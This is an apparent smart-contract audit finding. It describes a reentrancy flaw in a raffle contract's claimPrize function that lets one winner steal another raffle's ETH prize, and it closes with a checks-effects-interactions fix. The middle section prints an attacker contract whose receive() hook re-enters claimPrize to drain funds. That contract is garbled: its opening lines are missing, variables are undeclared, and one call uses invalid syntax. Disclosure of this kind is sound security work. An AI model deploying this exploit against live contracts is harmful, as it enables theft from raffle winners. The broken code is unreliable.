# Winner can steal prizes of other winners

## Summary
Winner can steal other raffles' prizes by reentering the `claimPrize(...)` function

## Vulnerability Detail
Let's consider this attack scenario:
- raffle1 is created
- users are buying tickets
- winner1 is drawn and propagated
- admin calls `withdrawETH()` and `lockETH()`
- raffle2 is created
- users are buying tickets
- winner2 is drawn and propagated
- admin calls `withdrawETH()` and `lockETH()`
- winner2 is actually a malicious smart contract that calls `claimPrize()` a first time on `raffle1` which will pass because this code will only be executed in the last entrance, the one where the malicious contract is actually the winner:
```solidity
        if (msg.sender != rafflePrize.winner) revert UnauthorizedToClaim();
        if (rafflePrize.status == RafflePrizeStatus.CLAIMED) revert AlreadyClaimed();
        rafflePrize.status = RafflePrizeStatus.CLAIMED;
        emit PrizeClaimed(raffleId, msg.sender);
```
Since `_sendETHPrize(...)` will send the prize of `raffle1` in the `receive()` of the malicious smart contract, where a 2nd call to `claimPrize(...)` will be made, but this time for `raffle2` (the raffle actually won by the malicious contract). For this 2nd entrance, the entire `claimPrize(...)` function will be successfully executed.
Here's the winner2/malicious contract code:

		prizeManager = IWinnablesPrizeManager(_prizeManager);
	}

	function withdrawAll() external {
		(bool success, ) = owner.call{ value: address(this).balance }("");
		require(success, "transfer failed");
	}

	function participate(uint256 raffleId,
        uint16 ticketCount,
        uint256 blockNumber,
        bytes calldata signature) external payable {
		require(msg.sender == owner, "not the owner");
		ticketManager.buyTickets(raffleId,
        ticketCount,
        blockNumber,
        signature);
		// or 
		ticketManager.call(abi.encodeWithSignature(
			"buyTickets(raffleId, ticketCount, blockNumber, signature)",
			raffleId, ticketCount, blockNumber, signature))
			{value: 100};
	}

	function attack(uint256 raffleId) external { // raffleId should be the id of the raffle of type ETH won by another innocent winner that has not claimed his prize yet
		require(msg.sender == owner, "not the owner");
		prizeManager.claimPrize(raffleId);
	}

	receive() external payable {
		if (!lastEntrance) {
			lastEntrance = true;
			prizeManager.claimPrize(raffleId); // raffleId should be the id of the raffle won by this contract
		}
	}
}
```

## Recommendation
Fix the bug by making the following changes that respect the CEI pattern:
```diff
function claimPrize(uint256 raffleId) external {
        RafflePrize storage rafflePrize = _rafflePrize[raffleId];
        RaffleType raffleType = rafflePrize.raffleType;
+       if (msg.sender != rafflePrize.winner) revert UnauthorizedToClaim();
+       if (rafflePrize.status == RafflePrizeStatus.CLAIMED) revert AlreadyClaimed();
+       rafflePrize.status = RafflePrizeStatus.CLAIMED;
        if (raffleType == RaffleType.NFT) {
            NFTInfo storage raffle = _nftRaffles[raffleId];
            _nftLocked[raffle.contractAddress][raffle.tokenId] = false;
            _sendNFTPrize(raffle.contractAddress, raffle.tokenId, msg.sender);
        } else if (raffleType == RaffleType.TOKEN) {
            TokenInfo storage raffle = _tokenRaffles[raffleId];
            unchecked { _tokensLocked[raffle.tokenAddress] -= raffle.amount; }
            _sendTokenPrize(raffle.tokenAddress, raffle.amount, msg.sender);
        } else if (raffleType == RaffleType.ETH) {
            unchecked { _ethLocked -= _ethRaffles[raffleId]; }
            _sendETHPrize(_ethRaffles[raffleId], msg.sender); // @audit reentrancy
        } else revert InvalidRaffle();
-       if (msg.sender != rafflePrize.winner) revert UnauthorizedToClaim();
-       if (rafflePrize.status == RafflePrizeStatus.CLAIMED) revert AlreadyClaimed();
-       rafflePrize.status = RafflePrizeStatus.CLAIMED;
        emit PrizeClaimed(raffleId, msg.sender);
    }
